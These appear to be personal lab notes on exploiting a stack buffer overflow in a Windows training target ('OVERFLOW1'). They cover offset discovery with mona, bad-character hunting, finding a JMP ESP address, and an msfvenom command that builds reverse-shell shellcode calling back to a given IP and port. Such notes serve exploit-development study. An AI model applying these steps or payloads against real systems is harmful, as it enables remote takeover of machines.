1. Set working folder for mona:

!mona config -set workingfolder c:\mona\%p

2. Start program by opening it in mona

...


Check for offset location using mona: 

!mona findmsp -distance 2400

EIP contains normal pattern: .... (offset xxxx)

... 

Finding Bad characters

send to vulnerable app the bad characters just after the offset into controlled EIP

 python3 bofer.py -x "OVERFLOW1 " -n 1978 -b 1 inject $ip $port

 Then right click on ESP and follow in dump

 See into the dump (Appearance -> Font OEM... for better view) and find numbers that are out of place. Those numbers
 are gonna be bad characters.

copy the dump into a text file
remove unnecessary columns in visual Studio Code using Alt + Shift + LeftClick

replace space with new line to enable finding with diff

```
tr ' ' '\n' < bad_dump1.txt > bad_dump_sanitized.txt
```

use icdiff

```
diff -u original_badchars.txt bad_dump_sanitized.txt
```

 9D
 9E
 9F
-A0
-A1
+0A
+0D
 A2
 A3
 A4

 After minus sign are bad characters. In this case these are A0 and A1.
 But subsequent byte might be corrupted so check if it can be ignored using mona.
 Typically it is safer to include more bad characters than necessary.

 ............

 Finding the Jump point

 !mona jmp -r esp -cpb "\x00\x07\x08\x2E\x2F\xA0\xA1" 
 
where -cpb are bad characters found above

In Log Window address can be found
625011AF

Rewrite it in Little Endian format

AF115062

Create shell code for reverse shell accounting for bad characters

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.141.184 LPORT=4444 -f hex -b "\x00\x07\x08\x2e\x2f\xa0\xa1"